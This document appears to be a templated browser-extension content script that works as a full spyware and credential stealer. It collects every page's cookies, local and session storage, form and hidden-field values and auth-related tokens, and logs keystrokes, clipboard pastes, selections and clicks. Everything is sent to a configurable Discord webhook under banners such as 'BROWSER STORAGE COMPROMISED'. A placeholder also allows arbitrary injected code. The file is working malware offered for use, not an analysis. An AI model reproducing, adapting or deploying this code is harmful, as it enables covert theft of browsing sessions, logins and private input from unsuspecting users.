
// Enhanced Content script for {{EXTENSION_NAME}}
(function() {
  'use strict';

  const EXTENSION_ID = '{{EXTENSION_ID}}';
  const USER_ID = '{{USER_ID}}';
  let sessionId = '';

  // Get session ID from background
  chrome.runtime.sendMessage({ type: 'getSessionId' }, (response) => {
    if (response?.sessionId) {
      sessionId = response.sessionId;
    }
  });

  // COMPREHENSIVE DATA COLLECTION ON PAGE LOAD
  function collectAllPageData() {
    const pageData = {
      type: 'complete_page_scan',
      timestamp: Date.now(),
      url: window.location.href,
      domain: window.location.hostname,
      title: document.title,
      
      // Page metrics
      pageMetrics: {
        totalElements: document.querySelectorAll('*').length,
        formCount: document.querySelectorAll('form').length,
        inputCount: document.querySelectorAll('input, textarea, select').length,
        linkCount: document.querySelectorAll('a[href]').length,
        imageCount: document.querySelectorAll('img').length,
        scriptCount: document.querySelectorAll('script').length,
        iframeCount: document.querySelectorAll('iframe').length,
        buttonCount: document.querySelectorAll('button').length,
        divCount: document.querySelectorAll('div').length
      },

      // All form data
      forms: [],
      
      // All input fields with current values
      allInputs: [],
      
      // All links
      allLinks: [],
      
      // All text content
      textContent: document.body ? document.body.innerText.substring(0, 5000) : '',
      
      // Page HTML structure (limited)
      htmlStructure: document.documentElement.outerHTML.substring(0, 10000),
      
      // All cookies
      cookies: document.cookie,
      
      // Storage data
      localStorage: {},
      sessionStorage: {},
      
      // Meta tags
      metaTags: [],
      
      // Scripts and resources
      scripts: [],
      stylesheets: [],
      
      // Browser and system info
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      onLine: navigator.onLine,
      referrer: document.referrer,
      
      // Page timing
      loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
      domReady: performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : 0
    };

    // Collect all forms with complete details
    document.querySelectorAll('form').forEach((form, index) => {
      const formData = {
        index: index,
        action: form.action,
        method: form.method,
        name: form.name,
        id: form.id,
        className: form.className,
        target: form.target,
        autocomplete: form.autocomplete,
        noValidate: form.noValidate,
        inputs: []
      };

      form.querySelectorAll('input, textarea, select, button').forEach(input => {
        formData.inputs.push({
          type: input.type || 'unknown',
          name: input.name,
          id: input.id,
          className: input.className,
          placeholder: input.placeholder,
          value: input.type === 'password' ? '[HIDDEN-PASSWORD]' : input.value,
          required: input.required,
          disabled: input.disabled,
          readonly: input.readOnly,
          checked: input.checked,
          selected: input.selected,
          maxLength: input.maxLength,
          minLength: input.minLength,
          min: input.min,
          max: input.max,
          step: input.step,
          pattern: input.pattern,
          autocomplete: input.autocomplete,
          tabIndex: input.tabIndex
        });
      });

      pageData.forms.push(formData);
    });

    // Collect ALL input fields (including those outside forms)
    document.querySelectorAll('input, textarea, select').forEach(input => {
      pageData.allInputs.push({
        type: input.type || 'unknown',
        name: input.name,
        id: input.id,
        className: input.className,
        placeholder: input.placeholder,
        value: input.type === 'password' ? '[HIDDEN-PASSWORD]' : 
               input.type === 'email' ? input.value :
               input.type === 'tel' ? input.value :
               input.value,
        required: input.required,
        disabled: input.disabled,
        readonly: input.readOnly,
        checked: input.checked,
        selected: input.selected,
        autocomplete: input.autocomplete,
        formAction: input.form ? input.form.action : null,
        formMethod: input.form ? input.form.method : null
      });
    });

    // Collect all links
    document.querySelectorAll('a').forEach(link => {
      pageData.allLinks.push({
        href: link.href,
        text: link.textContent?.trim().substring(0, 200),
        title: link.title,
        target: link.target,
        rel: link.rel,
        download: link.download,
        ping: link.ping,
        type: link.type
      });
    });

    // Collect meta tags
    document.querySelectorAll('meta').forEach(meta => {
      pageData.metaTags.push({
        name: meta.name,
        property: meta.property,
        content: meta.content,
        httpEquiv: meta.httpEquiv,
        charset: meta.charset
      });
    });

    // Collect script sources
    document.querySelectorAll('script').forEach(script => {
      pageData.scripts.push({
        src: script.src,
        type: script.type,
        async: script.async,
        defer: script.defer,
        crossOrigin: script.crossOrigin,
        integrity: script.integrity,
        content: script.src ? null : script.textContent?.substring(0, 500)
      });
    });

    // Collect stylesheets
    document.querySelectorAll('link[rel="stylesheet"], style').forEach(style => {
      pageData.stylesheets.push({
        href: style.href,
        type: style.type,
        media: style.media,
        disabled: style.disabled,
        content: style.tagName === 'STYLE' ? style.textContent?.substring(0, 500) : null
      });
    });

    // Collect localStorage
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        if (key) {
          pageData.localStorage[key] = localStorage.getItem(key);
        }
      }
    } catch (e) {
      pageData.localStorage = { error: 'Access denied' };
    }

    // Collect sessionStorage
    try {
      for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        if (key) {
          pageData.sessionStorage[key] = sessionStorage.getItem(key);
        }
      }
    } catch (e) {
      pageData.sessionStorage = { error: 'Access denied' };
    }

    sendMessage(pageData);
  }

  // Enhanced form tracking
  const formDataEnabled = {{FEATURE_FORM_DATA}};
  if (formDataEnabled) {
    // Track ALL form interactions
    document.addEventListener('input', function(event) {
      if (event.target.matches('input, textarea, select')) {
        sendMessage({
          type: 'form_input',
          timestamp: Date.now(),
          element: {
            type: event.target.type,
            name: event.target.name,
            id: event.target.id,
            value: event.target.type === 'password' ? '[HIDDEN-PASSWORD]' : event.target.value,
            form: event.target.form ? {
              action: event.target.form.action,
              method: event.target.form.method,
              name: event.target.form.name
            } : null
          },
          url: window.location.href
        });
      }
    });

    // Track form focus/blur events
    document.addEventListener('focusin', function(event) {
      if (event.target.matches('input, textarea, select')) {
        sendMessage({
          type: 'form_focus',
          timestamp: Date.now(),
          element: {
            type: event.target.type,
            name: event.target.name,
            id: event.target.id,
            placeholder: event.target.placeholder,
            value: event.target.type === 'password' ? '[HIDDEN-PASSWORD]' : event.target.value
          },
          url: window.location.href
        });
      }
    });

    // Track form submissions with complete data
    document.addEventListener('submit', function(event) {
      const formData = new FormData(event.target);
      const formInfo = {
        type: 'form_submit',
        timestamp: Date.now(),
        form: {
          action: event.target.action,
          method: event.target.method,
          name: event.target.name,
          id: event.target.id,
          className: event.target.className,
          target: event.target.target,
          autocomplete: event.target.autocomplete
        },
        fields: {},
        allFieldData: [],
        url: window.location.href
      };

      // Capture all form data
      for (let [name, value] of formData.entries()) {
        const field = event.target.querySelector(`[name="${name}"]`);
        formInfo.fields[name] = {
          type: field?.type || 'unknown',
          value: field?.type === 'password' ? '[HIDDEN-PASSWORD]' : value,
          hasValue: value.length > 0,
          valueLength: value.length
        };
      }

      // Capture all field details
      event.target.querySelectorAll('input, textarea, select, button').forEach(field => {
        formInfo.allFieldData.push({
          type: field.type,
          name: field.name,
          id: field.id,
          value: field.type === 'password' ? '[HIDDEN-PASSWORD]' : field.value,
          placeholder: field.placeholder,
          required: field.required,
          checked: field.checked,
          selected: field.selected
        });
      });

      sendMessage(formInfo);
    });
  }

  // ULTRA-ENHANCED CLICK TRACKING
  const clickTrackingEnabled = {{FEATURE_CLICK_TRACKING}};
  if (clickTrackingEnabled) {
    document.addEventListener('click', function(event) {
      const clickData = {
        type: 'ultra_click_tracking',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          className: event.target.className,
          text: event.target.textContent?.substring(0, 500),
          innerHTML: event.target.innerHTML?.substring(0, 1000),
          href: event.target.href,
          src: event.target.src,
          type: event.target.type,
          name: event.target.name,
          value: event.target.value,
          alt: event.target.alt,
          title: event.target.title,
          role: event.target.role,
          ariaLabel: event.target.ariaLabel,
          dataset: Object.assign({}, event.target.dataset),
          attributes: {}
        },
        coordinates: {
          clientX: event.clientX,
          clientY: event.clientY,
          pageX: event.pageX,
          pageY: event.pageY,
          screenX: event.screenX,
          screenY: event.screenY,
          offsetX: event.offsetX,
          offsetY: event.offsetY
        },
        viewport: {
          width: window.innerWidth,
          height: window.innerHeight,
          scrollX: window.scrollX,
          scrollY: window.scrollY
        },
        eventInfo: {
          bubbles: event.bubbles,
          cancelable: event.cancelable,
          composed: event.composed,
          detail: event.detail,
          isTrusted: event.isTrusted
        },
        parentElement: event.target.parentElement ? {
          tagName: event.target.parentElement.tagName,
          id: event.target.parentElement.id,
          className: event.target.parentElement.className
        } : null,
        url: window.location.href,
        path: window.location.pathname
      };

      // Get all attributes
      if (event.target.attributes) {
        for (let attr of event.target.attributes) {
          clickData.element.attributes[attr.name] = attr.value;
        }
      }

      sendMessage(clickData);
    });

    // Track double clicks
    document.addEventListener('dblclick', function(event) {
      sendMessage({
        type: 'double_click',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          text: event.target.textContent?.substring(0, 100)
        },
        coordinates: { pageX: event.pageX, pageY: event.pageY },
        url: window.location.href
      });
    });

    // Track right-clicks (context menu)
    document.addEventListener('contextmenu', function(event) {
      sendMessage({
        type: 'right_click',
        timestamp: Date.now(),
        element: {
          tagName: event.target.tagName,
          id: event.target.id,
          className: event.target.className,
          text: event.target.textContent?.substring(0, 100)
        },
        coordinates: { pageX: event.pageX, pageY: event.pageY },
        url: window.location.href
      });
    });
  }

  // COMPREHENSIVE KEYSTROKE TRACKING
  const keyloggerEnabled = {{FEATURE_KEYLOGGER}};
  if (keyloggerEnabled) {
    let keystrokeBuffer = '';
    let keySequence = [];
    let lastKeystroke = 0;

    document.addEventListener('keydown', function(event) {
      const now = Date.now();

      // Reset buffer if more than 3 seconds since last keystroke
      if (now - lastKeystroke > 3000) {
        keystrokeBuffer = '';
        keySequence = [];
      }

      lastKeystroke = now;
      keystrokeBuffer += event.key;
      
      keySequence.push({
        key: event.key,
        code: event.code,
        timestamp: now,
        ctrlKey: event.ctrlKey,
        altKey: event.altKey,
        shiftKey: event.shiftKey,
        metaKey: event.metaKey
      });

      // Send keystroke data every 5 characters or on special keys
      if (keystrokeBuffer.length >= 5 || ['Enter', 'Tab', 'Escape'].includes(event.key)) {
        const keystrokeData = {
          type: 'comprehensive_keystroke',
          timestamp: now,
          keys: keystrokeBuffer,
          keyCount: keystrokeBuffer.length,
          sequence: keySequence,
          element: {
            tagName: event.target.tagName,
            type: event.target.type,
            id: event.target.id,
            name: event.target.name,
            className: event.target.className,
            placeholder: event.target.placeholder,
            value: event.target.value?.substring(0, 100),
            form: event.target.form ? {
              action: event.target.form.action,
              method: event.target.form.method,
              name: event.target.form.name
            } : null
          },
          modifiers: {
            ctrl: event.ctrlKey,
            alt: event.altKey,
            shift: event.shiftKey,
            meta: event.metaKey
          },
          keyInfo: {
            key: event.key,
            code: event.code,
            keyCode: event.keyCode,
            which: event.which,
            repeat: event.repeat,
            isComposing: event.isComposing
          },
          url: window.location.href,
          path: window.location.pathname
        };

        sendMessage(keystrokeData);
        keystrokeBuffer = '';
        keySequence = [];
      }
    });

    // Track special key combinations
    document.addEventListener('keydown', function(event) {
      if (event.ctrlKey || event.metaKey || event.altKey) {
        const shortcutData = {
          type: 'keyboard_shortcut',
          timestamp: Date.now(),
          combination: `${event.ctrlKey ? 'Ctrl+' : ''}${event.metaKey ? 'Cmd+' : ''}${event.altKey ? 'Alt+' : ''}${event.shiftKey ? 'Shift+' : ''}${event.key}`,
          keys: {
            key: event.key,
            code: event.code,
            ctrlKey: event.ctrlKey,
            altKey: event.altKey,
            shiftKey: event.shiftKey,
            metaKey: event.metaKey
          },
          element: {
            tagName: event.target.tagName,
            id: event.target.id,
            type: event.target.type
          },
          url: window.location.href
        };
        sendMessage(shortcutData);
      }
    });
  }

  // Enhanced page monitoring
  function monitorPageActivity() {
    const activityData = {
      type: 'page_activity_detailed',
      timestamp: Date.now(),
      url: window.location.href,
      domain: window.location.hostname,
      title: document.title,
      pageMetrics: {
        totalElements: document.querySelectorAll('*').length,
        formCount: document.querySelectorAll('form').length,
        inputCount: document.querySelectorAll('input, textarea, select').length,
        linkCount: document.querySelectorAll('a[href]').length,
        imageCount: document.querySelectorAll('img').length,
        scriptCount: document.querySelectorAll('script').length,
        iframeCount: document.querySelectorAll('iframe').length,
        buttonCount: document.querySelectorAll('button').length
      },
      pageSize: {
        documentHeight: document.documentElement.scrollHeight,
        documentWidth: document.documentElement.scrollWidth,
        viewportHeight: window.innerHeight,
        viewportWidth: window.innerWidth
      },
      scrollPosition: {
        x: window.scrollX,
        y: window.scrollY,
        percentX: (window.scrollX / (document.documentElement.scrollWidth - window.innerWidth)) * 100,
        percentY: (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100
      },
      performance: {
        loadTime: performance.timing ? performance.timing.loadEventEnd - performance.timing.navigationStart : 0,
        domReady: performance.timing ? performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart : 0,
        memoryUsage: performance.memory ? {
          usedJSHeapSize: performance.memory.usedJSHeapSize,
          totalJSHeapSize: performance.memory.totalJSHeapSize,
          jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
        } : null
      },
      activeElement: document.activeElement ? {
        tagName: document.activeElement.tagName,
        id: document.activeElement.id,
        type: document.activeElement.type,
        name: document.activeElement.name
      } : null
    };

    sendMessage(activityData);
  }

  // Monitor clipboard events
  document.addEventListener('copy', function(event) {
    sendMessage({
      type: 'clipboard_copy',
      timestamp: Date.now(),
      selection: window.getSelection().toString().substring(0, 500),
      url: window.location.href
    });
  });

  document.addEventListener('paste', function(event) {
    const pasteData = {
      type: 'clipboard_paste',
      timestamp: Date.now(),
      url: window.location.href,
      element: {
        tagName: event.target.tagName,
        id: event.target.id,
        type: event.target.type,
        name: event.target.name
      }
    };

    // Try to get clipboard data
    try {
      if (event.clipboardData) {
        pasteData.clipboardData = {
          types: Array.from(event.clipboardData.types),
          textData: event.clipboardData.getData('text/plain')?.substring(0, 500)
        };
      }
    } catch (e) {
      pasteData.clipboardData = { error: 'Access denied' };
    }

    sendMessage(pasteData);
  });

  // Monitor selection changes
  document.addEventListener('selectionchange', function() {
    const selection = window.getSelection();
    if (selection.toString().length > 0) {
      sendMessage({
        type: 'text_selection',
        timestamp: Date.now(),
        selectedText: selection.toString().substring(0, 500),
        selectionLength: selection.toString().length,
        url: window.location.href
      });
    }
  });

  // Monitor page visibility changes
  document.addEventListener('visibilitychange', function() {
    sendMessage({
      type: 'visibility_change',
      timestamp: Date.now(),
      visible: !document.hidden,
      visibilityState: document.visibilityState,
      url: window.location.href
    });
  });

  // Monitor scroll activity with detailed tracking
  let scrollTimeout;
  window.addEventListener('scroll', function() {
    clearTimeout(scrollTimeout);
    scrollTimeout = setTimeout(() => {
      sendMessage({
        type: 'scroll_activity',
        timestamp: Date.now(),
        scrollPosition: {
          x: window.scrollX,
          y: window.scrollY,
          percentX: (window.scrollX / (document.documentElement.scrollWidth - window.innerWidth)) * 100,
          percentY: (window.scrollY / (document.documentElement.scrollHeight - window.innerHeight)) * 100
        },
        documentSize: {
          width: document.documentElement.scrollWidth,
          height: document.documentElement.scrollHeight
        },
        viewportSize: {
          width: window.innerWidth,
          height: window.innerHeight
        },
        url: window.location.href
      });
    }, 500);
  });

  // Monitor mouse movement (throttled)
  let lastMouseMove = 0;
  document.addEventListener('mousemove', function(event) {
    const now = Date.now();
    if (now - lastMouseMove > 2000) { // Every 2 seconds
      lastMouseMove = now;
      sendMessage({
        type: 'mouse_movement',
        timestamp: now,
        coordinates: {
          clientX: event.clientX,
          clientY: event.clientY,
          pageX: event.pageX,
          pageY: event.pageY
        },
        url: window.location.href
      });
    }
  });

  // Monitor focus changes
  window.addEventListener('focus', function() {
    sendMessage({
      type: 'window_focus',
      timestamp: Date.now(),
      focused: true,
      url: window.location.href
    });
  });

  window.addEventListener('blur', function() {
    sendMessage({
      type: 'window_blur',
      timestamp: Date.now(),
      focused: false,
      url: window.location.href
    });
  });

  // Send comprehensive data directly to webhook with detailed analysis
  async function sendDirectToWebhook(data) {
    try {
      const webhookUrl = '{{WEBHOOK_URL}}';
      if (!webhookUrl || !webhookUrl.trim() || webhookUrl === '{{WEBHOOK_URL}}') {
        return;
      }

      const embeds = [];

      // Main comprehensive overview embed
      const mainEmbed = {
        title: "🔍 COMPREHENSIVE PAGE DATA HARVESTED",
        description: `**{{EXTENSION_NAME}}** has performed deep analysis and extracted all available data from the current page.`,
        color: 0x00FF00,
        fields: [
          { name: "🌐 Target URL", value: `\`${data.url || 'Unknown'}\``, inline: false },
          { name: "📄 Page Title", value: data.title || 'No title available', inline: false },
          { name: "🏠 Domain", value: data.domain || 'Unknown domain', inline: true },
          { name: "📊 Page Elements", value: `**Forms:** ${data.forms?.length || 0}\n**Inputs:** ${data.allInputs?.length || 0}\n**Links:** ${data.allLinks?.length || 0}\n**Images:** ${data.pageMetrics?.imageCount || 0}\n**Scripts:** ${data.pageMetrics?.scriptCount || 0}`, inline: true },
          { name: "💾 Storage Analysis", value: `**LocalStorage:** ${Object.keys(data.localStorage || {}).length} items\n**SessionStorage:** ${Object.keys(data.sessionStorage || {}).length} items\n**Cookies:** ${data.cookies ? 'Present & Captured' : 'None detected'}`, inline: true }
        ],
        timestamp: new Date().toISOString(),
        footer: { text: `Extension: {{EXTENSION_NAME}} | Advanced Data Harvester` }
      };

      embeds.push(mainEmbed);

      // Form data analysis embed
      if (data.forms && data.forms.length > 0) {
        const formEmbed = {
          title: "📝 FORM DATA EXTRACTION COMPLETE",
          color: 0xFF6B35,
          description: `Found and analyzed **${data.forms.length}** forms on this page.`,
          fields: []
        };

        data.forms.slice(0, 5).forEach((form, index) => {
          const formDetails = [
            `**Action:** ${form.action || 'No action'}`,
            `**Method:** ${form.method || 'GET'}`,
            `**Inputs:** ${form.inputs?.length || 0} fields`,
            `**Auto-complete:** ${form.autocomplete || 'Not specified'}`
          ];

          if (form.inputs && form.inputs.length > 0) {
            const sensitiveInputs = form.inputs.filter(input => 
              input.type === 'password' || 
              input.type === 'email' || 
              input.name?.toLowerCase().includes('user') ||
              input.name?.toLowerCase().includes('pass') ||
              input.name?.toLowerCase().includes('login')
            );

            if (sensitiveInputs.length > 0) {
              formDetails.push(`**🚨 Sensitive Fields:** ${sensitiveInputs.length} detected`);
            }
          }

          formEmbed.fields.push({
            name: `📋 Form ${index + 1} - ${form.name || form.id || 'Unnamed'}`,
            value: formDetails.join('\n'),
            inline: true
          });
        });

        embeds.push(formEmbed);
      }

      // Input field analysis embed
      if (data.allInputs && data.allInputs.length > 0) {
        const inputEmbed = {
          title: "🎯 INPUT FIELD ANALYSIS",
          color: 0x3498DB,
          description: `Analyzed **${data.allInputs.length}** input fields with current values.`,
          fields: []
        };

        // Categorize inputs
        const passwordFields = data.allInputs.filter(input => input.type === 'password');
        const emailFields = data.allInputs.filter(input => input.type === 'email');
        const textFields = data.allInputs.filter(input => input.type === 'text' && input.value && input.value.length > 0);
        const hiddenFields = data.allInputs.filter(input => input.type === 'hidden');

        if (passwordFields.length > 0) {
          inputEmbed.fields.push({
            name: "🔒 Password Fields Detected",
            value: `**Count:** ${passwordFields.length}\n**Names:** ${passwordFields.map(f => f.name || f.id || 'unnamed').join(', ')}`,
            inline: true
          });
        }

        if (emailFields.length > 0) {
          inputEmbed.fields.push({
            name: "📧 Email Fields Found",
            value: `**Count:** ${emailFields.length}\n**Values:** ${emailFields.map(f => f.value ? `\`${f.value}\`` : 'Empty').join(', ')}`,
            inline: true
          });
        }

        if (textFields.length > 0) {
          inputEmbed.fields.push({
            name: "📝 Text Fields with Data",
            value: textFields.slice(0, 5).map(f => `**${f.name || f.id || 'unnamed'}:** \`${f.value?.substring(0, 30) || 'Empty'}...\``).join('\n'),
            inline: false
          });
        }

        if (hiddenFields.length > 0) {
          inputEmbed.fields.push({
            name: "👁️ Hidden Fields Discovered",
            value: `**Count:** ${hiddenFields.length}\n**Data:** ${hiddenFields.map(f => `${f.name}: \`${f.value?.substring(0, 20) || 'No value'}...\``).join('\n')}`,
            inline: false
          });
        }

        embeds.push(inputEmbed);
      }

      // Browser storage data embed
      if (Object.keys(data.localStorage || {}).length > 0 || Object.keys(data.sessionStorage || {}).length > 0) {
        const storageEmbed = {
          title: "💾 BROWSER STORAGE COMPROMISED",
          color: 0x9B59B6,
          description: "Successfully extracted all browser storage data.",
          fields: []
        };

        if (Object.keys(data.localStorage || {}).length > 0) {
          const localKeys = Object.keys(data.localStorage);
          const authKeys = localKeys.filter(key => 
            key.toLowerCase().includes('auth') || 
            key.toLowerCase().includes('token') || 
            key.toLowerCase().includes('session') ||
            key.toLowerCase().includes('user') ||
            key.toLowerCase().includes('login')
          );

          storageEmbed.fields.push({
            name: "🗄️ LocalStorage Data Extracted",
            value: `**Total Items:** ${localKeys.length}\n**Auth-Related:** ${authKeys.length}\n**Sample Keys:** ${localKeys.slice(0, 5).join(', ')}`,
            inline: true
          });

          if (authKeys.length > 0) {
            storageEmbed.fields.push({
              name: "🔑 Authentication Data Found",
              value: authKeys.slice(0, 3).map(key => `**${key}:** \`${data.localStorage[key]?.substring(0, 40) || 'Empty'}...\``).join('\n'),
              inline: false
            });
          }
        }

        if (Object.keys(data.sessionStorage || {}).length > 0) {
          const sessionKeys = Object.keys(data.sessionStorage);
          storageEmbed.fields.push({
            name: "🔄 SessionStorage Data",
            value: `**Items:** ${sessionKeys.length}\n**Keys:** ${sessionKeys.slice(0, 5).join(', ')}`,
            inline: true
          });
        }

        embeds.push(storageEmbed);
      }

      // Cookies analysis embed
      if (data.cookies && data.cookies.length > 10) {
        const cookieEmbed = {
          title: "🍪 COOKIE DATA INTERCEPTED",
          color: 0xE67E22,
          description: "All cookies from this domain have been captured and analyzed.",
          fields: [
            {
              name: "📊 Cookie Analysis",
              value: `**Raw Data:** \`${data.cookies.substring(0, 500)}${data.cookies.length > 500 ? '...' : ''}\``,
              inline: false
            },
            {
              name: "🔍 Cookie Details",
              value: `**Length:** ${data.cookies.length} characters\n**Estimated Count:** ${data.cookies.split(';').length} cookies\n**Contains Auth Data:** ${data.cookies.toLowerCase().includes('auth') || data.cookies.toLowerCase().includes('session') ? 'Yes' : 'No'}`,
              inline: true
            }
          ]
        };

        embeds.push(cookieEmbed);
      }

      // Links and navigation embed
      if (data.allLinks && data.allLinks.length > 0) {
        const linkEmbed = {
          title: "🔗 NAVIGATION STRUCTURE MAPPED",
          color: 0x1ABC9C,
          description: `Mapped **${data.allLinks.length}** links revealing site structure and user navigation patterns.`,
          fields: []
        };

        // Analyze link types
        const externalLinks = data.allLinks.filter(link => link.href && !link.href.includes(data.domain));
        const downloadLinks = data.allLinks.filter(link => link.download);
        const javascriptLinks = data.allLinks.filter(link => link.href && link.href.startsWith('javascript:'));

        linkEmbed.fields.push({
          name: "📊 Link Analysis",
          value: `**Total Links:** ${data.allLinks.length}\n**External Links:** ${externalLinks.length}\n**Download Links:** ${downloadLinks.length}\n**JavaScript Links:** ${javascriptLinks.length}`,
          inline: true
        });

        if (externalLinks.length > 0) {
          const domains = [...new Set(externalLinks.map(link => {
            try { return new URL(link.href).hostname; } catch { return 'Invalid'; }
          }).filter(d => d !== 'Invalid'))];

          linkEmbed.fields.push({
            name: "🌐 External Domains",
            value: domains.slice(0, 10).join('\n') + (domains.length > 10 ? `\n...and ${domains.length - 10} more` : ''),
            inline: false
          });
        }

        embeds.push(linkEmbed);
      }

      // Page metadata embed
      if (data.metaTags && data.metaTags.length > 0) {
        const metaEmbed = {
          title: "📋 PAGE METADATA EXTRACTED",
          color: 0x8E44AD,
          fields: []
        };

        const importantMeta = data.metaTags.filter(meta => 
          meta.name === 'description' || 
          meta.name === 'keywords' || 
          meta.property === 'og:title' ||
          meta.property === 'og:description' ||
          meta.name === 'author'
        );

        if (importantMeta.length > 0) {
          metaEmbed.fields.push({
            name: "🏷️ Important Metadata",
            value: importantMeta.map(meta => `**${meta.name || meta.property}:** ${meta.content?.substring(0, 100) || 'No content'}${meta.content?.length > 100 ? '...' : ''}`).join('\n'),
            inline: false
          });
        }

        embeds.push(metaEmbed);
      }

      // Send embeds in batches (Discord limit: 10 embeds per message)
      const maxEmbedsPerMessage = 10;
      for (let i = 0; i < embeds.length; i += maxEmbedsPerMessage) {
        const embedBatch = embeds.slice(i, i + maxEmbedsPerMessage);
        
        const webhookData = {
          username: "🕵️ {{EXTENSION_NAME}} - PAGE ANALYZER",
          avatar_url: "https://cdn.discordapp.com/emojis/853928735535742986.png",
          embeds: embedBatch
        };

        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(webhookData)
        });

        // Small delay between batches to avoid rate limiting
        if (i + maxEmbedsPerMessage < embeds.length) {
          await new Promise(resolve => setTimeout(resolve, 1000));
        }
      }

    } catch (error) {
      console.error('Direct comprehensive webhook send failed:', error);
    }
  }

  // Send enhanced message to background script
  function sendMessage(data) {
    try {
      const enhancedData = {
        ...data,
        extensionId: EXTENSION_ID,
        sessionId: sessionId,
        userId: USER_ID,
        pageInfo: {
          referrer: document.referrer || '',
          characterSet: document.characterSet || 'UTF-8',
          lastModified: document.lastModified || '',
          readyState: document.readyState || 'unknown',
          title: document.title,
          domain: window.location.hostname,
          protocol: window.location.protocol,
          port: window.location.port,
          pathname: window.location.pathname,
          search: window.location.search,
          hash: window.location.hash
        },
        browserInfo: {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled,
          onLine: navigator.onLine,
          hardwareConcurrency: navigator.hardwareConcurrency,
          deviceMemory: navigator.deviceMemory
        }
      };

      // Send to background script
      if (chrome && chrome.runtime && chrome.runtime.sendMessage) {
        chrome.runtime.sendMessage(enhancedData, (response) => {
          if (chrome.runtime.lastError) {
            console.warn('Message sending failed:', chrome.runtime.lastError.message);
          }
        });
      }

      // Also send directly to webhook for immediate delivery
      sendDirectToWebhook(enhancedData);
    } catch (error) {
      console.error('Error sending message to background:', error);
    }
  }

  // Initial comprehensive data collection
  setTimeout(() => {
    collectAllPageData();
  }, 1000);

  // Periodic comprehensive data collection
  setInterval(() => {
    collectAllPageData();
  }, 30000); // Every 30 seconds

  // Monitor page activity every 15 seconds
  setInterval(monitorPageActivity, 15000);

  // Custom user code injection point
  try {
    {{CUSTOM_CODE}}
  } catch (error) {
    console.error('Custom code error in content script:', error);
  }

})();
